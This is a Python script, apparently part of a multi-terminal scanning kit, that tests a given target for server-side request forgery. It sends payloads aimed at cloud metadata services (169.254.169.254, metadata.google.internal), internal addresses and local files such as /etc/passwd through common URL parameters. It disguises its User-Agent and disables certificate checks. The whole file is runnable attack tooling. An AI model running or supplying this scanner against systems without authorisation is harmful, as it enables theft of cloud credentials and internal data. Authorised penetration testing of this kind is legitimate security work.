#!/usr/bin/env python3
"""TERMINAL 4: SSRF Testing with Cloud Metadata"""
import requests, sys, json, os, urllib.parse
from datetime import datetime
import warnings
warnings.filterwarnings('ignore')

class Colors:
    HEADER, OKBLUE, OKCYAN, OKGREEN, WARNING, FAIL, ENDC, BOLD = '\033[95m', '\033[94m', '\033[96m', '\033[92m', '\033[93m', '\033[91m', '\033[0m', '\033[1m'

class SSRFTester:
    def __init__(self, target, workspace="/tmp"):
        self.target, self.workspace = target, workspace
        self.results_file = f"{workspace}/results/ssrf_scan.json"
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        self.vulnerabilities = []
        self.payloads = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254",
            "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal",
            "http://192.168.1.1", "http://10.0.0.1", "file:///etc/passwd", "file:///C:/windows/win.ini"]
        self.params = ['url', 'path', 'dest', 'redirect', 'uri', 'src', 'link', 'proxy', 'feed']
        self.indicators = ['root:', 'localhost', 'metadata', 'ec2', 'aws', 'instance-id', 'windows']
        print(f"""{Colors.HEADER}\n╔══════════════════════════════════════════════════════════════════╗\n║           TERMINAL 4: SERVER-SIDE REQUEST FORGERY (SSRF)         ║\n╚══════════════════════════════════════════════════════════════════╝{Colors.ENDC}\nTarget: {target} | Payloads: {len(self.payloads)}""")

    def get_urls(self):
        urls, paths = [], ['', '/', '/fetch', '/proxy', '/redirect', '/url', '/api/fetch']
        for p in ['http', 'https']:
            for path in paths:
                urls.append(f"{p}://{self.target}{path}")
        for port in [80, 443, 8080, 3000, 8000]:
            proto = 'https' if port in [443, 8443] else 'http'
            for path in paths[:6]:
                urls.append(f"{proto}://{self.target}:{port}{path}")
        return urls

    def test_ssrf(self, url, param, payload):
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            r = self.session.get(test_url, timeout=15, verify=False, allow_redirects=False)
            for ind in self.indicators:
                if ind.lower() in r.text.lower():
                    return {'type': 'SSRF', 'url': test_url, 'param': param, 'payload': payload,
                        'evidence': f"Found: {ind}", 'status': r.status_code, 'severity': 'High'}
        except: pass
        return None

    def run(self):
        print(f"\n{Colors.BOLD}[PHASE 1] Direct SSRF Testing{Colors.ENDC}\n")
        for url in self.get_urls()[:15]:
            print(f"{Colors.OKBLUE}[*] Testing: {url}{Colors.ENDC}")
            for param in self.params:
                for payload in self.payloads:
                    result = self.test_ssrf(url, param, payload)
                    if result:
                        self.vulnerabilities.append(result)
                        print(f"{Colors.FAIL}[!] SSRF FOUND!{Colors.ENDC}\n  {result['url']}\n  Evidence: {result['evidence']}")
                        if '169.254.169.254' in payload:
                            print(f"  {Colors.FAIL}CLOUD METADATA ACCESSIBLE!{Colors.ENDC}")
                        break
                if self.vulnerabilities:
                    break
            if len(self.vulnerabilities) >= 3:
                break

        os.makedirs(os.path.dirname(self.results_file), exist_ok=True)
        with open(self.results_file, 'w') as f:
            json.dump({'target': self.target, 'time': datetime.now().isoformat(),
                'vulns': self.vulnerabilities, 'count': len(self.vulnerabilities)}, f, indent=2)
        print(f"\n{Colors.OKGREEN}[+] Results: {self.results_file}{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n{Colors.BOLD}SSRF Scan Complete{Colors.ENDC} | Found: {len(self.vulnerabilities)}{Colors.ENDC}\n")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: terminal4_ssrf.py <target>")
        sys.exit(1)
    SSRFTester(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else "/tmp").run()
